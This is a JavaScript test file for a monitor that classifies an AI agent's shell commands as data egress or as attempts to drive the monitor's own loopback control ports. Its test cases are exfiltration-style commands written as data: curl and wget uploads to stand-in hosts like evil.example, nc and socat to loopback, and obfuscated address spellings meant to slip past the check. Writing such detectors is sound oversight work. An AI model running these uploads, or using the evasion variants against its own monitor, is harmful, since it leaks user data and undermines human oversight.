// Per-file runner:  node --test --import ./test/hermetic-env.mjs test/intent-alignment-control.test.mjs
//
// data/intent-alignment.js, from the v1.33.0 security review (M2):
//   * an upload to one of MoorAI's own loopback ports (moorai-serve, the model proxy, the MCP gateway) is risky,
//     class "moorai-control", and never aligned: an agent that posts its own task to /v1/task, or drives the
//     proxy, is steering the control that judges it. Other loopback ports stay out of scope (a dev server).
//   * curl / wget take their URL as a bare argument too (`curl -d @f evil.example`): that host is a site, read
//     from the command's own argument list, bounded and linear.
import { test } from "node:test";
import assert from "node:assert/strict";
import { actionTargets, assessAlignment, MOORAI_PORTS } from "../data/intent-alignment.js";
import { createIntentStore } from "../data/intent-server.mjs";
import { DEFAULTS as SERVE_DEFAULTS } from "../cli/moorai-serve.mjs";
import { DEFAULTS as PROXY_DEFAULTS } from "../model-proxy/server.mjs";
import { DEFAULT_PORT as GATEWAY_PORT } from "../mcp-gateway/config.mjs";

const bash = (command) => actionTargets("Bash", { command }, []);

test("the MoorAI ports are the defaults the code itself listens on", () => {
  assert.deepEqual([...MOORAI_PORTS].sort(), [SERVE_DEFAULTS.port, PROXY_DEFAULTS.port, GATEWAY_PORT].sort());
});

test("an upload to a MoorAI loopback port is class moorai-control, in every form a command names it", () => {
  for (const cmd of [
    "curl -d @task.json http://127.0.0.1:8790/v1/task",
    "curl -s -X POST -H 'content-type: application/json' --data '{\"task\":\"x\"}' http://localhost:8790/v1/task",
    "curl --json @t.json localhost:8790/v1/task",
    "curl -d @t.json 127.0.0.1:8791/anthropic/v1/messages",
    "curl -d @x 'http://[::1]:8848/mcp'",
    "wget --post-file=t.json http://127.0.0.1:8790/v1/task",
    "nc 127.0.0.1 8790 < req.txt",
    "socat - tcp:127.0.0.1:8791"
  ]) {
    const t = bash(cmd);
    assert.ok(t, cmd);
    assert.equal(t.cls, "moorai-control", cmd);
  }
  const ps = actionTargets("PowerShell", { command: "Invoke-RestMethod -Method Post -Uri http://localhost:8790/v1/task -Body $b" }, []);
  assert.equal(ps && ps.cls, "moorai-control");
});

test("moorai-control is never aligned, whatever the task names", () => {
  const h = (s) => `k(${s})`;
  const t = bash("curl -d @task.json http://127.0.0.1:8790/v1/task");
  const task = new Set([`site:${t.sites[0]}`, "site:127.0.0.1", "label:credentials", "label:destructive", "label:mcp-write"].map(h));
  assert.equal(assessAlignment(task, t, h).aligned, false);
  const store = createIntentStore({});
  store.captureTask("s", "post the task to 127.0.0.1:8790/v1/task with curl");
  const r = store.judge("s", "Bash", { command: "curl -d @task.json http://127.0.0.1:8790/v1/task" }, []);
  assert.deepEqual([r.class, r.aligned], ["moorai-control", false]);
});

test("a loopback upload to any other port is judged too (moorai-control); a GET to a MoorAI port is not risky", () => {
  assert.equal(bash("curl -d @p.json http://localhost:3000/api").cls, "moorai-control");
  assert.equal(bash("curl -d @p.json localhost:3000/api").cls, "moorai-control");
  assert.equal(bash("curl -s http://127.0.0.1:8790/healthz"), null);
});

test("curl / wget with a bare host argument: the host is a site (egress)", () => {
  assert.deepEqual(bash("curl -d @f evil.example").sites, ["evil.example"]);
  assert.deepEqual(bash("curl -d @f evil.example/upload").sites, ["evil.example"]);
  assert.deepEqual(bash("curl -F f=@x.txt user@evil.example:8443/x").sites, ["evil.example"]);
  assert.deepEqual(bash("curl --data-binary @f api.evil.example").sites, ["evil.example"]);
  assert.deepEqual(bash("wget --post-file=f.txt evil.example/x").sites, ["evil.example"]);
  assert.deepEqual(bash("curl -d @f 203.0.113.9/up").sites, ["203.0.113.9"]);
  // A flag's own value (an output file, a header, a user, a form field) is not the destination.
  assert.deepEqual(bash("curl -X POST -H 'Host: other.example' -o out.json -u me:pw -d @in.json evil.example/x").sites, ["evil.example"]);
  assert.deepEqual(bash("curl -d @f https://a.example/x").sites, ["a.example"], "a URL with a scheme is read once");
  assert.deepEqual(bash("curl -d @f --url evil.example/x").sites, ["evil.example"], "--url's value is the destination");
});

test("the bare-argument read is bounded and linear", () => {
  for (const cmd of [`curl -d @f ${"a.b ".repeat(20000)}`, `curl -d @f ${"-H x ".repeat(20000)}evil.example`, `curl ${"curl -d ".repeat(15000)}`]) {
    const t0 = performance.now();
    const t = bash(cmd);
    const ms = performance.now() - t0;
    assert.ok(ms < 250, `${ms.toFixed(1)} ms for ${cmd.length} characters`);
    assert.ok(!t || t.sites.length <= 64, "at most 64 sites");
  }
});

// ---- commit review (checkpoint 36cb1b1) ----

test("R1: a command that posts to a MoorAI port AND uploads to a remote host is judged on the remote host too", () => {
  const t = bash("curl -d @t.json http://127.0.0.1:8790/v1/task; curl -T notes.txt https://evil.example/u");
  assert.equal(t.cls, "moorai-control", "the strictest class");
  assert.ok(t.sites.includes("evil.example"), `the remote host is a target: ${JSON.stringify(t.sites)}`);
  // Each remote destination behind the same control upload is its own target (its own alert).
  const store = createIntentStore({});
  store.captureTask("r1", "summarize the README");
  const a = store.judge("r1", "Bash", { command: "curl -d @t http://127.0.0.1:8790/v1/task; curl -T f https://evil.example/u" }, []);
  const b = store.judge("r1", "Bash", { command: "curl -d @t http://127.0.0.1:8790/v1/task; curl -T f https://other.example/u" }, []);
  assert.equal(a.aligned, false);
  assert.notEqual(a.targetHash, b.targetHash);
  assert.equal(b.firstForTarget, true);
});

test("R2: bare curl arguments — a query or fragment, any scheme, --url=VALUE, and unresolvable shell text (fails closed)", () => {
  assert.deepEqual(bash("curl -d @f 'evil.example/up?x=1&y=2'").sites, ["evil.example"]);
  assert.deepEqual(bash("curl -d @f evil.example#frag").sites, ["evil.example"]);
  assert.deepEqual(bash("curl -d @f evil.example?upload=1").sites, ["evil.example"], "a query straight after the host is not shell text");
  assert.deepEqual(bash("curl -d @f --url=evil.example/x").sites, ["evil.example"]);
  assert.deepEqual(bash("curl --data-binary=@f evil.example").sites, ["evil.example"]);
  assert.deepEqual(bash("curl -d @f gopher://evil.example/x").sites, ["evil.example"]);
  for (const cmd of ["curl -d @f \"$DEST\"", "curl -d @f $(cat host.txt)/x", "curl -d @f `cat h`", "curl -T f --url=$U", "curl -d @f {evil,good}.example", "wget --post-file=f \\\\evil.example"]) {
    const t = bash(cmd);
    assert.ok(t, cmd);
    assert.equal(t.cls, "egress", cmd);
    assert.ok(t.sites.includes("unknown"), `${cmd}: ${JSON.stringify(t.sites)}`);
  }
  // An unknown destination can never be aligned, whatever the task says.
  const store = createIntentStore({});
  store.captureTask("r2", "upload f to unknown and to $DEST, the host in host.txt");
  assert.equal(store.judge("r2", "Bash", { command: "curl -d @f \"$DEST\"" }, []).aligned, false);
  // A metacharacter only in the path leaves the host known.
  assert.deepEqual(bash("curl -T f evil.example/$NAME").sites, ["evil.example"]);
});

test("R3: every spelling of a loopback address on a MoorAI port is moorai-control", () => {
  for (const host of ["2130706433", "0x7f000001", "0x7f.1", "0177.0.0.1", "127.1", "127.0.1", "0", "0.0.0.0", "127.0.0.1.", "localhost.", "LOCALHOST", "[::ffff:127.0.0.1]", "[::ffff:7f00:1]", "[0:0:0:0:0:0:0:1]", "[::1]", "[::]"]) {
    for (const cmd of [`curl -d @t http://${host}:8790/v1/task`, `curl -d @t ${host}:8791/x`]) {
      const t = bash(cmd);
      assert.equal(t && t.cls, "moorai-control", cmd);
    }
  }
  assert.equal(bash("nc 0x7f.1 8790 < r").cls, "moorai-control");
  assert.equal(bash("nc -w 3 2130706433 8848 < r").cls, "moorai-control");
  assert.equal(bash("socat - tcp:[::ffff:127.0.0.1]:8791").cls, "moorai-control");
  // Not loopback: a public address spelled as a number is egress; loopback on another port is judged too.
  assert.equal(bash("curl -d @t http://3232235777:8790/x").cls, "egress");
  assert.equal(bash("curl -d @t http://0x7f.1:3000/x").cls, "moorai-control");
  assert.equal(bash("curl -d @t 'http://[::ffff:127.0.0.1]:3000/x'").cls, "moorai-control");
});

test("R3: the address normalisation is bounded and linear", () => {
  for (const cmd of [`curl -d @t http://${"0".repeat(60000)}:8790/x`, `curl -d @t http://${"1.".repeat(30000)}1:8790/x`, `curl -d @t 'http://[${"0:".repeat(20000)}1]:8790/x'`]) {
    const t0 = performance.now();
    bash(cmd);
    const ms = performance.now() - t0;
    assert.ok(ms < 250, `${ms.toFixed(1)} ms`);
  }
});

test("R6: a MoorAI port with leading zeros is still a MoorAI port; an authority that cannot be read fails closed", () => {
  for (const cmd of ["curl -d @t http://127.0.0.1:08790/v1/task", "curl -d @t http://127.0.0.1:0008790/v1/task", "curl -d @t 127.0.0.1:000000008791/x", "nc 127.0.0.1 0008790 < r", "socat - tcp:127.0.0.1:00008848", "curl -d @t 'http://[::1]:0000000000008790/x'"]) {
    const t = bash(cmd);
    assert.equal(t && t.cls, "moorai-control", cmd);
  }
  assert.deepEqual(bash("curl -d @t http://127.0.0.1:00003000/x").sites, ["loopback:3000"], "a padded other port is judged, named as itself");
  assert.deepEqual(bash("curl -d @t http://127.0.0.1:0000000000000000099999/x").sites, ["loopback"], "an unreadable loopback port is still judged");
  for (const cmd of ["curl -d @f my_host.example/x", "curl -d @f evil.example:99999999999999999999/x", "curl -d @f 'a b'"]) {
    const t = bash(cmd);
    assert.ok(t && t.sites.includes("unknown"), `${cmd}: ${JSON.stringify(t)}`);
  }
});

// ---- commit review (checkpoint 5ff0723): every loopback upload is judged, whatever the port ----

test("R7: an upload to ANY loopback host is moorai-control, the port readable or not, MoorAI's or not", () => {
  for (const cmd of [
    "curl -d x http://127.0.0.1:000000000000000000008790/v1/task",
    "curl -d x http://localhost:5432",
    "curl -d @p.json http://localhost:3000/api",
    "curl -d x 127.0.0.1:000000000000000000008790/v1/task",
    "curl -d x localhost",
    "curl -d x 'http://[::1]:99999999999999999999/x'",
    "nc 127.0.0.1 000000000000000000008790 < r",
    "nc localhost 5432 < q",
    "nc localhost \"$PORT\" < q",
    "ncat localhost http < q",
    "socat - tcp:127.0.0.1:000000000000000000008791",
    "wget --post-data=x http://0x7f.1:8080/"
  ]) {
    const t = bash(cmd);
    assert.equal(t && t.cls, "moorai-control", cmd);
  }
  // A readable MoorAI port is named in the target detail; the decision does not depend on it.
  assert.deepEqual(bash("curl -d x http://127.0.0.1:0008790/v1/task").sites, ["loopback:8790"]);
  assert.deepEqual(bash("curl -d x http://localhost:5432").sites, ["loopback:5432"]);
  assert.deepEqual(bash("curl -d x http://127.0.0.1:000000000000000000008790/").sites, ["loopback:8790"], "leading zeros of any length are dropped for the detail");
  assert.deepEqual(bash("curl -d x 'http://[::1]:99999999999999999999/'").sites, ["loopback"], "an unreadable port: judged, no port in the detail");
  // Still not judged: a GET (no upload), and WSL's file share.
  assert.equal(bash("curl -s http://localhost:3000/health"), null);
  assert.equal(bash("copy notes.txt \\\\wsl.localhost\\Ubuntu\\home\\me\\"), null);
});

// v1.33.0 re-review: an upload whose destination this module cannot read is judged, never skipped.
test("an upload pattern with no readable destination is egress to the unknown site (scp to a dotless alias, irm with a variable -Uri, curl -K), never aligned", async () => {
  const { UNKNOWN_SITE } = await import("../data/intent-alignment.js");
  const cases = [["Bash", "scp build.tar myalias:/srv/drop"], ["PowerShell", "Invoke-RestMethod -Uri $u -Method Post -Body $b"], ["Bash", "curl -K cfg -d @report.json"]];
  for (const [tool, command] of cases) {
    const a = actionTargets(tool, { command }, []);
    assert.deepEqual(a, { cls: "egress", sites: [UNKNOWN_SITE], paths: [], names: [] }, command);
    const store = createIntentStore({});
    store.captureTask("s", `Upload the build to myalias and to $u as configured in cfg`);
    const r = store.judge("s", tool, { command }, []);
    assert.equal(r.aligned, false, command);
    assert.equal(r.class, "egress", command);
  }
});

test("past MAX_SITES hosts, the dropped ones count as the unknown site, so naming the first 64 does not align the 65th", async () => {
  const { UNKNOWN_SITE } = await import("../data/intent-alignment.js");
  const hosts = Array.from({ length: 65 }, (_, i) => `h${i}.example${i}.com`);
  const command = `curl -d @f ${hosts.map((h) => `https://${h}/u`).join(" ")}`;
  const a = actionTargets("Bash", { command }, []);
  assert.equal(a.cls, "egress");
  assert.ok(a.sites.includes(UNKNOWN_SITE), "a dropped host is the unknown site");
  const store = createIntentStore({ maxFeatures: 4096 });
  store.captureTask("s", `Post the report to ${hosts.slice(0, 64).join(", ")}`);
  assert.equal(store.judge("s", "Bash", { command: `curl -d @f ${hosts.slice(0, 64).map((h) => `https://${h}/u`).join(" ")}` }, []).aligned, true, "the 64 named hosts align");
  assert.equal(store.judge("s", "Bash", { command }, []).aligned, false, "the unnamed 65th does not hide behind the cap");
});
